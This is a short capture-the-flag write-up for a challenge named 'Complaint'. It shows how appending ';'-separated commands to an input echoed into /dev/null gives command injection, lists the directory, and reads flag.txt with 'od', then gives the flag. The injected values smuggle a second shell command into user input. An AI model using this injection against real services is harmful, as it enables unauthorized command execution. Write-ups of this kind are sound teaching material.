# Complaint

![](complaint.png)

From the description you can assume a bash syntax similar to this:

```bash
echo SOMEINPUT > /dev/null
```

This unfortunately means that all the input is moved in the void; or is it?

There are a few ways of executing multiple commands at once.
You can for example concatenate multiple commands using `;` or execute multiple commands after each other by using `&&`.
Thus I had found a way to execute my own commands with this input:

```bash
;do something;
```
With this it was easy to locate the flag file:
```bash
;ls;
```
```raw
WHAT IS BOTHERING YOU???
;ls;

bin
boot
chall
dev
etc
flag.txt
home
lib
lib64
media
mnt
opt
proc
root
run
sbin
srv
sys
tmp
usr
var
YOUR COMPLAINT HAS BEEN RECORDED.
```

The only problem now was that the most common tools to print files were missing.
No `cat`, `head`, `tail`, `less`, `more` and a lot more...
Fortunately though `od` was still available.
This means that the flag could be extracted by running
```bash
;od -t a flag.txt;
```
This gave the expected result and printed the flag.

### Flag: `X-MAS{h3ll0_k4r3n-8819d787dd38a397}`

